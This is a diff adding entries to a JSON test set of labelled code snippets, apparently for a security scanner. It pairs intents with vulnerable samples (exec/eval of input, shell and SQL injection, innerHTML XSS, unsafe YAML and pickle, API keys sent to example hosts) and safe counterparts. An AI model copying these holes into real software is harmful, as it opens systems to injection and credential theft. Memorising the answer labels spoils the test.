@@ -1,18 +1,204 @@
 [
-  {"id":"py-public-post","language":"Python","intent":"Send a public status message; do not transmit credentials.","code":"import requests\nrequests.post('https://example.com/status', json={'message':'ready'})","dangerous":false},
-  {"id":"py-overwritten-secret","language":"Python","intent":"Send a public status message.","code":"import os, requests\nvalue = os.getenv('API_KEY')\nvalue = 'ready'\nrequests.post('https://example.com/status', json={'message':value})","dangerous":false},
-  {"id":"py-no-send","language":"Python","intent":"Prepare an upload but do not send it.","code":"import os\nfrom urllib.request import Request\nreq = Request('https://example.com/upload', data=os.getenv('API_KEY').encode())","dangerous":false},
-  {"id":"py-keyword-comment","language":"Python","intent":"Print a harmless value.","code":"# Do not execute eval(input())\nprint('hello')","dangerous":false},
-  {"id":"js-safe-dom","language":"JavaScript","intent":"Display the value from the query string as text.","code":"const q = new URLSearchParams(location.search).get('q');\ndocument.querySelector('#result').textContent = q;","dangerous":false},
-  {"id":"js-fixed-markup","language":"JavaScript","intent":"Show a fixed greeting.","code":"document.querySelector('#result').innerHTML = '<b>Hello</b>';","dangerous":false},
-  {"id":"py-secret-post","language":"Python","intent":"Send only a public status message; do not transmit credentials.","code":"import os, requests\nvalue = os.getenv('API_KEY')\nrequests.post('https://example.com/status', json={'message':value})","dangerous":true},
-  {"id":"py-secret-send","language":"Python","intent":"Prepare a request but do not send it.","code":"import os\nfrom urllib.request import Request, urlopen\nreq = Request('https://example.com/upload', data=os.getenv('API_KEY').encode())\nurlopen(req)","dangerous":true},
-  {"id":"py-exec-input","language":"Python","intent":"Print the supplied value.","code":"value = input('Value: ')\nexec(value)","dangerous":true},
-  {"id":"py-shell-injection","language":"Python","intent":"Show a file selected by the user.","code":"import subprocess\nname = input('File: ')\nsubprocess.run('cat ' + name, shell=True)","dangerous":true},
-  {"id":"js-unsafe-dom","language":"JavaScript","intent":"Display the value from the query string as text.","code":"const q = new URLSearchParams(location.search).get('q');\ndocument.querySelector('#result').innerHTML = q;","dangerous":true},
-  {"id":"js-eval-input","language":"JavaScript","intent":"Display a submitted value.","code":"const value = window.location.hash.slice(1);\neval(value);","dangerous":true},
-  {"id":"js-regex-exec","language":"JavaScript","intent":"Extract a matching text pattern.","code":"const pattern = /hello/;\nconst match = pattern.exec(input);","dangerous":false,"rule":"javascript.child-process-exec","expect_rule":false},
-  {"id":"js-child-exec-alias","language":"JavaScript","intent":"Show a status message.","code":"const cp = require('child_process');\ncp.exec(req.body.command);","dangerous":true,"rule":"javascript.child-process-exec","expect_rule":true},
-  {"id":"js-node-child-exec-alias","language":"JavaScript","intent":"Show a status message.","code":"const cp = require('node:child_process');\ncp.exec(req.body.command);","dangerous":true,"rule":"javascript.child-process-exec","expect_rule":true},
-  {"id":"ts-unsafe-dom","language":"TypeScript","intent":"Display query text.","code":"const name: string = location.hash.slice(1);\ndocument.querySelector('#a')!.innerHTML = name;","dangerous":true}
+  {
+    "id": "py-public-post",
+    "language": "Python",
+    "intent": "Send a public status message; do not transmit credentials.",
+    "code": "import requests\nrequests.post('https://example.com/status', json={'message':'ready'})",
+    "dangerous": false
+  },
+  {
+    "id": "py-overwritten-secret",
+    "language": "Python",
+    "intent": "Send a public status message.",
+    "code": "import os, requests\nvalue = os.getenv('API_KEY')\nvalue = 'ready'\nrequests.post('https://example.com/status', json={'message':value})",
+    "dangerous": false
+  },
+  {
+    "id": "py-no-send",
+    "language": "Python",
+    "intent": "Prepare an upload but do not send it.",
+    "code": "import os\nfrom urllib.request import Request\nreq = Request('https://example.com/upload', data=os.getenv('API_KEY').encode())",
+    "dangerous": false
+  },
+  {
+    "id": "py-keyword-comment",
+    "language": "Python",
+    "intent": "Print a harmless value.",
+    "code": "# Do not execute eval(input())\nprint('hello')",
+    "dangerous": false
+  },
+  {
+    "id": "js-safe-dom",
+    "language": "JavaScript",
+    "intent": "Display the value from the query string as text.",
+    "code": "const q = new URLSearchParams(location.search).get('q');\ndocument.querySelector('#result').textContent = q;",
+    "dangerous": false
+  },
+  {
+    "id": "js-fixed-markup",
+    "language": "JavaScript",
+    "intent": "Show a fixed greeting.",
+    "code": "document.querySelector('#result').innerHTML = '<b>Hello</b>';",
+    "dangerous": false
+  },
+  {
+    "id": "py-secret-post",
+    "language": "Python",
+    "intent": "Send only a public status message; do not transmit credentials.",
+    "code": "import os, requests\nvalue = os.getenv('API_KEY')\nrequests.post('https://example.com/status', json={'message':value})",
+    "dangerous": true
+  },
+  {
+    "id": "py-secret-send",
+    "language": "Python",
+    "intent": "Prepare a request but do not send it.",
+    "code": "import os\nfrom urllib.request import Request, urlopen\nreq = Request('https://example.com/upload', data=os.getenv('API_KEY').encode())\nurlopen(req)",
+    "dangerous": true
+  },
+  {
+    "id": "py-exec-input",
+    "language": "Python",
+    "intent": "Print the supplied value.",
+    "code": "value = input('Value: ')\nexec(value)",
+    "dangerous": true
+  },
+  {
+    "id": "py-shell-injection",
+    "language": "Python",
+    "intent": "Show a file selected by the user.",
+    "code": "import subprocess\nname = input('File: ')\nsubprocess.run('cat ' + name, shell=True)",
+    "dangerous": true
+  },
+  {
+    "id": "js-unsafe-dom",
+    "language": "JavaScript",
+    "intent": "Display the value from the query string as text.",
+    "code": "const q = new URLSearchParams(location.search).get('q');\ndocument.querySelector('#result').innerHTML = q;",
+    "dangerous": true
+  },
+  {
+    "id": "js-eval-input",
+    "language": "JavaScript",
+    "intent": "Display a submitted value.",
+    "code": "const value = window.location.hash.slice(1);\neval(value);",
+    "dangerous": true
+  },
+  {
+    "id": "js-regex-exec",
+    "language": "JavaScript",
+    "intent": "Extract a matching text pattern.",
+    "code": "const pattern = /hello/;\nconst match = pattern.exec(input);",
+    "dangerous": false,
+    "rule": "javascript.child-process-exec",
+    "expect_rule": false
+  },
+  {
+    "id": "js-child-exec-alias",
+    "language": "JavaScript",
+    "intent": "Show a status message.",
+    "code": "const cp = require('child_process');\ncp.exec(req.body.command);",
+    "dangerous": true,
+    "rule": "javascript.child-process-exec",
+    "expect_rule": true
+  },
+  {
+    "id": "js-node-child-exec-alias",
+    "language": "JavaScript",
+    "intent": "Show a status message.",
+    "code": "const cp = require('node:child_process');\ncp.exec(req.body.command);",
+    "dangerous": true,
+    "rule": "javascript.child-process-exec",
+    "expect_rule": true
+  },
+  {
+    "id": "ts-unsafe-dom",
+    "language": "TypeScript",
+    "intent": "Display query text.",
+    "code": "const name: string = location.hash.slice(1);\ndocument.querySelector('#a')!.innerHTML = name;",
+    "dangerous": true
+  },
+  {
+    "id": "py-sql-unsafe",
+    "language": "Python",
+    "intent": "Read user record",
+    "code": "import sqlite3\ndb = sqlite3.connect('test.db')\nuser=input('name')\ndb.execute('SELECT * FROM users WHERE name = '+user)",
+    "dangerous": true
+  },
+  {
+    "id": "py-sql-safe",
+    "language": "Python",
+    "intent": "Read user record",
+    "code": "import sqlite3\ndb = sqlite3.connect('test.db')\nuser=input('name')\ndb.execute('SELECT * FROM users WHERE name = ?', (user,))",
+    "dangerous": false
+  },
+  {
+    "id": "py-yaml-unsafe",
+    "language": "Python",
+    "intent": "Load a YAML document",
+    "code": "import yaml\ndata=input()\nresult=yaml.load(data, Loader=yaml.Loader)",
+    "dangerous": true
+  },
+  {
+    "id": "py-yaml-safe",
+    "language": "Python",
+    "intent": "Load a YAML document",
+    "code": "import yaml\ndata=input()\nresult=yaml.safe_load(data)",
+    "dangerous": false
+  },
+  {
+    "id": "py-pickle",
+    "language": "Python",
+    "intent": "Read untrusted content",
+    "code": "import pickle\ndata=input()\nobj=pickle.loads(data.encode())",
+    "dangerous": true
+  },
+  {
+    "id": "py-json",
+    "language": "Python",
+    "intent": "Read untrusted content",
+    "code": "import json\ndata=input()\nobj=json.loads(data)",
+    "dangerous": false
+  },
+  {
+    "id": "js-dom-danger",
+    "language": "JavaScript",
+    "intent": "Display query as text",
+    "code": "let query = new URLSearchParams(location.search).get('q');\ndocument.getElementById('x').innerHTML = query;",
+    "dangerous": true
+  },
+  {
+    "id": "js-dom-safe",
+    "language": "JavaScript",
+    "intent": "Display query as text",
+    "code": "let query = new URLSearchParams(location.search).get('q');\ndocument.getElementById('x').textContent = query;",
+    "dangerous": false
+  },
+  {
+    "id": "js-fixed-https-one",
+    "language": "JavaScript",
+    "intent": "Send a fixed public status request",
+    "code": "fetch('https://example.com/status', {method: 'POST', body: 'ready'});",
+    "dangerous": false
+  },
+  {
+    "id": "js-fixed-https-multiline",
+    "language": "JavaScript",
+    "intent": "Send a fixed public status request",
+    "code": "fetch(\n  'https://example.com/status',\n  {method: 'POST', body: 'ready'}\n);",
+    "dangerous": false
+  },
+  {
+    "id": "py-secret-alias",
+    "language": "Python",
+    "intent": "Send only a public message",
+    "code": "import os\nfrom requests import post as transmit\ntransmit('https://example.invalid', json={'value':os.getenv('API_KEY')})",
+    "dangerous": true
+  },
+  {
+    "id": "py-expected-named-auth",
+    "language": "Python",
+    "intent": "Authenticate to example.invalid using the API key in the authorization header.",
+    "code": "import os, requests\nrequests.get('https://example.invalid/status', headers={'Authorization': 'Bearer '+os.getenv('API_KEY')})",
+    "dangerous": false
+  }
 ]
